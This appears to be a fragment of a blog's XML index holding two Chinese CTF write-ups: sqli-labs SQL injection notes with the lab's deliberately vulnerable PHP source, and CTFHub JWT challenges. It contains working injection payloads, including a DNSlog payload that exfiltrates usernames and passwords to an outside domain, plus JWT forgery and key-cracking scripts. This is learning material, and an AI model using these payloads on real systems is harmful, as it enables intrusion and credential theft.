+当你想判断对不对的时候，你就让对的睡一会，错的继续肝，这样你就能看出来了
+
+布尔盲注
+下面几个方法各有优缺点
+因为能知道 sql-lab 靶场数据库的数据
+所以刷题时我多用 left
+实际
+substr
+substr(a,b,c)将 a 字段从第 b 个字符读取 c 个字符
+ascii
+将括号中的字符转换为 acsii 码，再在最后进行值大小的判断，正确返回 1，错误返回 0
+
+类似于数学中的二分法
+left
+left(a)从第一位开始读取 a 个字符
+
+模糊查询 like
+a like ‘%b%’ 判断 a 字符串里是否有 b
+a like ‘b%’ 判断 a 开头是否有 b 数
+regexp
+regexp ‘a’正则表达式
+
+RegExp 对象表示正则表达式，它是对字符串执行模式匹配的强大工具 正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。
+许多语言都有正则表达式
+物理也有正则
+所以正则是个啥(≧﹏ ≦)
+
+实操进阶
+有报错回显 无正确回显
+也就是说你在前四关能看见的绿字在 5-8 关用 you are in 替换了
+也就是你之前查的库名 表名 列名 和数据不会回显了
+当使用布尔盲注时 如果判断正确就会显示 you are in
+不正确的话就会报错
+下图是第五关第一个用户名 最后一步注入语句
+之前步骤参考第 1 到 4 关查各类信息的语句并用布尔盲注所用函数包装
+正确回显和报错回显都没有
+不论你输入啥，他都会说 you are in
+
+就像你说 啊对对对
+
+这样 布尔盲注也没法用了
+你不知道注入语句是对是错
+这时就要用时间盲注了
+把布尔盲注再进行包装
+if(布尔盲注语句,sleep(3),1)
+正确的话，浏览器会延时 3 秒再运行
+
+POST 传参
+先讲理论
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&#x3C;!--Form to post the data for sql injections Error based SQL Injection-->
+&#x3C;form action="" name="form1" method="post">
+	&#x3C;div style="margin-top:15px; height:30px;">Username : &#x26;nbsp;&#x26;nbsp;&#x26;nbsp;
+	    &#x3C;input type="text"  name="uname" value=""/>
+	&#x3C;/div>
+	&#x3C;div> Password  : &#x26;nbsp;&#x26;nbsp;&#x26;nbsp;
+		&#x3C;input type="text" name="passwd" value=""/>
+	&#x3C;/div>&#x3C;/br>
+	&#x3C;div style=" margin-top:9px;margin-left:90px;">
+		&#x3C;input type="submit" name="submit" value="Submit" />
+	&#x3C;/div>
+&#x3C;/form>
+        `上面是前端 通过post传参uname和passwd`
+&#x3C;?php
+// take the variables
+if(isset($_POST['uname']) &#x26;&#x26; isset($_POST['passwd']))
+{
+	$uname=$_POST['uname'];
+	$passwd=$_POST['passwd'];
+/后端接收前端传的参数
+	//logging the connection parameters to a file for analysis.
+	$fp=fopen('result.txt','a');
+	fwrite($fp,'User Name:'.$uname);
+	fwrite($fp,'Password:'.$passwd."\n");
+	fclose($fp);
+// connectivity
+	@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
+	$result=mysql_query($sql);
+	$row = mysql_fetch_array($result);
+
+	if($row)
+	{
+  		//echo '&#x3C;font color= "#0000ff">';
+  		echo "&#x3C;br>";
+		echo '&#x3C;font color= "#FFFF00" font size = 4>';
+		//echo " You Have successfully logged in\n\n " ;
+		echo '&#x3C;font size="3" color="#0000ff">';
+		echo "&#x3C;br>";
+		echo 'Your Login name:'. $row['username'];
+		echo "&#x3C;br>";
+		echo 'Your Password:' .$row['password'];
+		echo "&#x3C;br>";
+		echo "&#x3C;/font>";
+		echo "&#x3C;br>";
+		echo "&#x3C;br>";
+		echo '&#x3C;img src="../images/flag.jpg"  />';
+		/又是这里分成两部分，上面是正确回显
+		下面是报错回显
+		echo "&#x3C;/font>";
+  	}
+	else
+	{
+		echo '&#x3C;font color= "#0000ff" font size="3">';
+		//echo "Try again looser";
+		print_r(mysql_error());
+		echo "&#x3C;/br>";
+		echo "&#x3C;/br>";
+		echo "&#x3C;/br>";
+		echo '&#x3C;img src="../images/slap.jpg" />';
+		echo "&#x3C;/font>";
+	}
+}
+?>
+post传参
+post 传参有很多方式最本质的就是在输入框传
+然后是一些插件具有传参功能 hackbar 他们一般需要配合抓包的插件使用
+较多的是一些抓包软件，burpsuit 等
+他们既有抓包功能，也有重发器，测试器功能强大
+注入语句
+和 get 传参类型的语句大体相同，不同的地方有原来的 id=1’由于 get 传参，抓包后自动写入 uname/password=所以只需要写后面的 admin’ 加上 sql 执行语句，原理一样，都是让系统执行完传参后继续把 sql 语句执行来回显 这里末尾注释符可用#
+实操
+post 传参同样有三大类
+正误回显都有
+在 burpsuit 重发器里传参，
+
+红字部分即为注入语句，这里同样只展示最后一步 其他可按照 get 传参原理
+只需改动小部分
+没正确回显 有报错回显
+这里我采用了辨识度更高的时间盲注 布尔盲注同样使用
+正错回显都没有
+同上面直接时间盲注
+基于报错注入的各种传参方式
+先讲报错注入
+updatexml
+updatexml (XML_document, XPath_string, new_value)
+替换查找到的符合条件的数据
+extactvalue
+extractvalue(XML_document, XPath_string)
+对 XML 文档进行查询的函数
+当上述两个函数的 xpath 路径出错时，将 XML_document 报错返回回来
+注意只能返回 32 个字符，后面的可用 limit 等来限制返回的字符位置
+传参方式
+burp suite 抓包后改相应数据
+user-agent 注入
+1User-Agent:'or updatexml(1,concat(0x7e,(select database()),0x7e),1) or'
+referer 注入
+cookie 注入
+base64 加密的 cookie 注入
+将 payload 经 base64 加密后上传即可
+过滤注释的GET
+源码中过滤掉了注释符
+注释符不能用了所以要在闭合上下功夫
+12?id=' union select 1,group_concat(username),group_concat(password) from users where 1 or '1' = '1
+?id=-1' union select 1,(select group_concat(username) from users),'3
+在末尾构造语句使闭合符号与语句组成一个不影响的语句
+闭合方式多种多样
+二次注入
+首先注册一个用户 admin‘#
+然后登录
+修改密码
+当你修改密码时 后台就执行了
+1UPDATE users SET passwd="新密码" WHERE username =' admin' # ' AND password='
+也就是
+你用 admin’#用户把 admin 用户的密码给改了
+过滤
+过滤 or 和 and
+将 payload 里所有 and 和 or
+替换为 anandd 和 oorr
+这里 password 也要变成 passwoorrd
+1?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from users#
+过滤下的报错注入
+26
+12345678$id= preg_replace('/or/i',"", $id);			/strip out OR (non case sensitive)
+	$id= preg_replace('/and/i',"", $id);		/Strip out AND (non case sensitive)
+	$id= preg_replace('/[\/\*]/',"", $id);		/strip out */
+	$id= preg_replace('/[--]/',"", $id);		/Strip out --
+	$id= preg_replace('/[#]/',"", $id);			/Strip out #
+	$id= preg_replace('/[\s]/',"", $id);		/Strip out spaces
+	$id= preg_replace('/[\/\\\\]/',"", $id);		/Strip out slashes
+	return $id;
+要用到||代替 or information 里的 or 要双写，用||‘1’=‘1 来闭合
+1?id=0'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1)||'1'='1
+
+27
+
+1?id=0'||updatexml(1,concat(0x7e,(SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema='security'))),1)||'1'='1
+大小写 select 和 union
+过滤下的时间盲注
+26 到 27 关的 a 都是无法报错注入的
+能用时间盲注过滤方法和不带 a 的关一样
+waf
+12345678910111213141516171819202122232425262728293031323334/ take the variables
+if(isset($_GET['id'])){
+	$qs = $_SERVER['QUERY_STRING'];
+	$hint=$qs;
+	$id1=java_implimentation($qs);
+	$id=$_GET['id'];
+	//echo $id1;
+	whitelist($id1);}
+
+/WAF implimentation with a whitelist approach..... only allows input to be Numeric.
+function whitelist($input){
+	$match = preg_match("/^\d+$/", $input);
+	if($match)
+		{//echo "you are good";
+			//return $match;
+			}
+	else
+		{header('Location: hacked.php');
+			//echo "you are bad";
+			}
+}
+/ The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).
+function java_implimentation($query_string){
+	$q_s = $query_string;
+	$qs_array= explode("&#x26;",$q_s);
+	foreach($qs_array as $key => $value){
+		$val=substr($value,0,2);
+		if($val=="id"){
+			$id_value=substr($value,3,30);
+			return $id_value;
+			echo "&#x3C;br>";
+			break;}
+		}
+}
+java_implimentation 模拟 tomcat 的查询函数处理
+whitelist 白名单过滤 检测到不符合规则就重定向
+漏洞是 whitelist 只检测了 java_implimentation 输出的第一个参数$id_value
+后面的逃过检测 注入点在后面
+
+宽字节注入
+MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。
+urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。
+
+结束注释
+当转译为‘/时可用’/**/来结束注释
+堆叠注入
+在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。结束一个 sql 语句后继续构造下一条语句，会一起执行 因此产生了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间区别在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句
+堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在 SQL 注入中还是比较频繁的。
+如下展示了堆叠注入插入了一个用户数据
+同时也可以进行 dnslog 注入
+1?id=1';select load_file(concat('//',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.au0mvd.dnslog.cn/1.txt'));--+
+
+123desc查看表结构的详细信息
+desc table_name;
+此处desc是describe的缩写，用法: desc 表名/查询语句
+handler 适用于 select 等过滤
+12345handler handler_table open;
+handler handler_table read first;
+handler handler_table read next;
+……
+handler handler_table close;
+二次注入进阶
+需成功登录才能二次注入
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546function sqllogin($host,$dbuser,$dbpass, $dbname){
+   // connectivity
+//mysql connections for stacked query examples.
+$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);
+
+   $username = mysqli_real_escape_string($con1, $_POST["login_user"]);
+   $password = $_POST["login_password"];
+
+   // Check connection
+   if (mysqli_connect_errno($con1))
+   {
+       echo "Failed to connect to MySQL: " . mysqli_connect_error();
+   }
+   else
+   {
+       @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database ######: ");
+   }
+ /* execute multi query */
+ 	$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
+   if (@mysqli_multi_query($con1, $sql))
+   {
+        /* store first result set */
+      if($result = @mysqli_store_result($con1))
+      {
+	 if($row = @mysqli_fetch_row($result)){
+	    if ($row[1]) {
+	       return $row[1];
+	    }
+	    else{
+	       return 0;
+	    }
+	 }
+      }
+
+      else  {
+	echo '&#x3C;font size="5" color= "#FFFF00">';
+	print_r(mysqli_error($con1));
+	echo "&#x3C;/font>";
+      }
+   }
+   else
+   {
+	echo '&#x3C;font size="5" color= "#FFFF00">';
+	print_r(mysqli_error($con1));
+	echo "&#x3C;/font>";
+    }
+这里对 username 和 password 过滤不强
+可通过万能密码
+11’ or '1'='1
+登录
+接下来通过修改密码界面二次注入
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&#x3C;?PHP
+session_start();
+if (!isset($_COOKIE["Auth"])){
+	if (!isset($_SESSION["username"])) {
+  		header('Location: index.php');
+	}
+	header('Location: index.php');
+}
+?>
+&#x3C;?php
+//including the Mysql connect parameters.
+include("../sql-connections/sql-connect.php");
+if (isset($_POST['submit'])){
+	# Validating the user input........
+	$username= $_SESSION["username"];
+	$curr_pass= mysql_real_escape_string($_POST['current_password']);//原密码 还是万能密码绕过
+	$pass= mysql_real_escape_string($_POST['password']);//新密码
+	$re_pass= mysql_real_escape_string($_POST['re_password']);
+	if($pass==$re_pass){
+		$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
+		$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
+		$row = mysql_affected_rows();
+		echo '&#x3C;font size="3" color="#FFFF00">';
+		echo '&#x3C;center>';
+		if($row==1){
+			//echo "Password successfully updated";
+			echo '&#x3C;img src="../images/password-updated.jpg">';
+			}
+		else{
+			header('Location: failed.php');
+			//echo 'You tried to be smart, Try harder!!!! :( ';
+
+		}
+	}
+	else{
+		echo '&#x3C;font size="5" color="#FFFF00">&#x3C;center>';
+		echo "Make sure New Password and Retype Password fields have same value";
+		header('refresh:2, url=index.php');
+	}
+}
+?>
+&#x3C;?php
+if(isset($_POST['submit1']))
+{
+	session_destroy();
+	setcookie('Auth', 1 , time()-3600);
+	header ('Location: index.php');
+}
+?>
+他用户名通过 session 获取，所以无法更改其他用户
+order by注入
+1SELECT * FROM users ORDER BY
+order by 与 where 差不多
+但不同是 order by 不能使用 union 联合
+其他都可 也比较灵活
+从 46 到 53 关皆为 order by 注入
+限制次数的注入
+从 54 关开始，限制了注入次数
+一旦超过次数就会改变数据
+一切又要重新开始
+
+
+
+58-62 可以报错注入
+从 62 关开始只能使用盲注
+id注入部分代码
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&#x3C;?php
+id注入部分代码
+//including the Mysql connect parameters.
+include '../sql-connections/sql-connect-1.php';
+include '../sql-connections/functions.php';
+error_reporting(0);
+$pag = $_SERVER['PHP_SELF']; /generating page address to piggy back after redirects...
+$characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; /characterset for generating random data
+$times= 10;
+$table = table_name();
+$col = column_name(1);     / session id column name
+$col1 = column_name(2);   /secret key column name
+/ Submitting the final answer
+if(!isset($_POST['answer_key'])){
+	/ resetting the challenge and repopulating the table .
+	if(isset($_POST['reset'])){
+		setcookie('challenge', ' ', time() - 3600000);
+		echo "&#x3C;font size=4>You have reset the Challenge&#x3C;/font>&#x3C;br>\n";
+		echo "Redirecting you to main challenge page..........\n";
+		header( "refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag" );
+		//echo "cookie expired";
+
+	}
+	else{
+		/ Checking the cookie on the page and populate the table with random value.
+		if(isset($_COOKIE['challenge'])){
+			$sessid=$_COOKIE['challenge'];
+			//echo "Cookie value: ".$sessid;
+		}
+		else{
+			$expire = time()+60*60*24*30;
+			$hash = data($table,$col);
+			setcookie("challenge", $hash, $expire);
+
+		}
+
+		echo "&#x3C;br>\n";
+		/take the variables
+		if(isset($_GET['id'])){
+			$id=$_GET['id'];
+			/logging the connection parameters to a file for analysis.
+			$fp=fopen('result.txt','a');
+			fwrite($fp,'ID:'.$id."\n");
+			fclose($fp);
+			/update the counter in database
+			next_tryy();
+			/Display attempts on screen.
+			$tryyy = view_attempts();
+			echo "You have made : ". $tryyy ." of $times attempts";
+			echo "&#x3C;br>&#x3C;br>&#x3C;br>\n";
+		  /Reset the Database if you exceed allowed attempts.
+			if($tryyy >= ($times+1)){
+				setcookie('challenge', ' ', time() - 3600000);
+				echo "&#x3C;font size=4>You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &#x3C;/font>&#x3C;br>\n";
+				echo "Redirecting you to challenge page..........\n";
+				header( "refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag" );
+				echo "&#x3C;br>\n";
+			}
+		/ Querry DB to get the correct output
+			$sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
+			$result=mysql_query($sql);
+			$row = mysql_fetch_array($result);
+			if($row){
+				echo '&#x3C;font color= "#00FFFF">';
+				echo 'Your Login name:'. $row['username'];
+				echo "&#x3C;br>";
+				echo 'Your Password:' .$row['password'];
+				echo "&#x3C;/font>";
+			}
+			else {
+				echo '&#x3C;font color= "#FFFF00">';
+//				print_r(mysql_error());
+				echo "&#x3C;/font>";
+			}
+		}
+		else{
+			echo "Please input the ID as parameter with numeric value as done in  Lab excercises\n&#x3C;br>&#x3C;br>\n&#x3C;/font>";
+			echo "&#x3C;font color='#00FFFF': size=3>The objective of this challenge is to dump the &#x3C;b>(secret key)&#x3C;/b> from only random table from Database &#x3C;b>&#x3C;i>('CHALLENGES')&#x3C;/i>&#x3C;/b> in Less than $times attempts&#x3C;br>";
+			echo "For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&#x3C;br>" ;
+		}
+	}
+}
+答案提交部分
+1234567891011121314151617181920212223242526272829else
+{
+	echo '&#x3C;div  style=" color:#00FFFF; font-size:18px; text-align:center">';
+	$key = addslashes($_POST['key']);
+	$key = mysql_real_escape_string($key);
+	//echo $key;
+	/Query table to verify your result
+	$sql="SELECT 1 FROM $table WHERE $col1= '$key'";
+	//echo "$sql";
+	$result=mysql_query($sql)or die("error in submittion of Key Solution".mysql_error());
+	$row = mysql_fetch_array($result);
+	if($row)
+	{
+		echo '&#x3C;font color= "#FFFF00">';
+		echo "\n&#x3C;br>&#x3C;br>&#x3C;br>";
+		echo '&#x3C;img src="../images/Less-54-1.jpg" />';
+		echo "&#x3C;/font>";
+		header( "refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag" );
+	}
+	else {
+		echo '&#x3C;font color= "#FFFF00">';
+		echo "\n&#x3C;br>&#x3C;br>&#x3C;br>";
+		echo '&#x3C;img src="../images/slap1.jpg" />';
+		header( "refresh:3;url=index.php" );
+		//print_r(mysql_error());
+		echo "&#x3C;/font>";
+		}
+}
+?>]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sql</tag>
+        <tag>sqli-lab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfhub-jwt</title>
+    <url>/2022/09/jwt/</url>
+    <content><![CDATA[基础知识
+题目附件：jwt 基础知识
+flag 在下面
+需要了解一下 jwt 组成部分
+敏感信息泄露
+随便输个
+进去查消息头
+然后在
+jwt.io
+decode 一共两部分 ag 是另一半
+
+无签名
+12345678910import jwt
+algorithm="none"
+payload = {
+  "username": "admin",
+  "password": "admin",
+  "role":"admin"
+  }
+key = ""
+encoded = jwt.encode(payload,key,algorithm)
+print(encoded)
+jwt 的签名可以为无
+
+今天写这个脚本的时候命名为 jwt.py
+结果报错 但是系统环境运行正常
+才知道是文件名的事
+import jwt 他先自己引用自己了
+
+抓包
+把 cookie 里的 token 改为这脚本的运行结果
+弱密钥
+需要用到jwt-cracker
+依次执行即可
+1234git clone https://github.com/brendan-rius/c-jwt-cracker
+./c-jwt-cracker
+make
+./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs
+然后得出该 jwt 密钥
+然后放之前那个网站
+改 role 为 admin
+
+返回提交 token
+
+修改签名算法
+把 cookie 清空后提交用户名密码
+得到一串 jwt
+丢进
+
+发现是 RS256 编码（不对称式编码)
+需要改为对称式编码
+如 HS256
+题目中给了 public key
+用 PUBLIC_KEY 采用 HS256 进行加密 payload 构造 token
+借用大神 h0ld1rs的脚本
+
+无签名那段脚本
+是勉勉强强写出来的
+这题就先用大神的脚本吧
+我太菜了
+
+123456789101112131415161718192021222324252627## coding=GBK
+import hmac
+import hashlib
+import base64
+
+file = open('publickey.pem')#需要将文中的publickey下载	与脚本同目录
+key = file.read()
+
+## Paste your header and payload here
+header = '{"typ": "JWT", "alg": "HS256"}'
+payload = '{"username": "admin", "role": "admin"}'
+
+## Creating encoded header
+encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
+encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")
+
+## Creating encoded payload
+encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
+encodePayload = str(encodePBytes, "utf-8").rstrip("=")
+
+## Concatenating header and payload
+token = (encodeHeader + "." + encodePayload)
+
+## Creating signature
+sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("UTF-8").rstrip("=")
+
+print(token + "." + sig)
+运行后把 token 返回去验证
+成功
+
+
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>jwt</tag>
+        <tag>json web token</tag>
       </tags>
   </entry>
   <entry>
